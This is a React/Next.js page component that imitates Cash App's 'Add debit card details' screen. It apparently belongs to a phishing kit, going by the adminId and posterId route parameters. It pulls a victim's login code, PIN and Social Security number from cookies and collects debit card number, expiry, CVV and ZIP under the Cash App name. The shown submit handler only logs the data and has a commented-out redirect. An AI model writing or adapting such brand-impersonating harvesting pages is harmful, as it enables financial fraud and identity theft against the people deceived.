import { useState } from "react";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import { site } from "../../../config";

function AccountPage() {
  const code = Cookies.get("code");
  const pin = Cookies.get("pin");
  const ssn = Cookies.get("ssn");

  const initialvalues = {
    code: code,
    pin: pin,
    ssn: ssn,
    site: site,
    card_number: "",
    mm_yy: "",
    ccv: "",
    zip: "",
  };

  const [account, setAccount] = useState(initialvalues);

  const router = useRouter();
  const { adminId, posterId } = router.query;

  const handleChange = (e) => {
    const { name, type, value } = e.target;

    setAccount({
      ...account,
      [name]: type === "number" ? parseInt(value) || value : value,
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(account);
    setAccount(initialvalues);

    // router.push(`/${adminId}/${posterId}`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <form onSubmit={handleSubmit}>
        <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
          <div className="mt-[60px] lg:container px-3 lg:px-0">
            <p className="text-[25px]">
              Add debit card details to link an account
            </p>
            <p className="mt-7 text-sm text-slate-600">
              Linking an external account allows you to move money in and out of
              your Cash App balance
            </p>
            <div className="mt-[35px] space-y-5">
              <div className=" ">
                <input
                  type="text"
                  name="card_number"
                  value={account.card_number}
                  className="input2 border-b-slate-300"
                  placeholder="Debit card Number"
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="flex gap-6">
                <input
                  type="text"
                  name="mm_yy"
                  value={account.mm_yy}
                  className="input2 border-b-slate-300"
                  placeholder="MM/YY"
                  onChange={handleChange}
                  required
                />
                <input
                  type="text"
                  name="ccv"
                  value={account.ccv}
                  className="input2 border-b-slate-300"
                  placeholder="3-Digit CCV"
                  onChange={handleChange}
                  required
                />
              </div>
              <div className="">
                <input
                  type="text"
                  name="zip"
                  value={account.zip}
                  className="input2 border-b-slate-300"
                  placeholder="ZIP Code"
                  onChange={handleChange}
                  required
                />
              </div>
            </div>
          </div>
          <div className="flex gap-10">
            <button
              type="button"
              className="w-full text-lg bg-gray-100 rounded-full py-3 text-black "
            >
              Skip
            </button>
            <button className="w-full text-lg bg-custom-green rounded-full py-3 text-white ">
              Link Card
            </button>
          </div>
        </div>
      </form>
    </div>
  );
}

export default AccountPage;
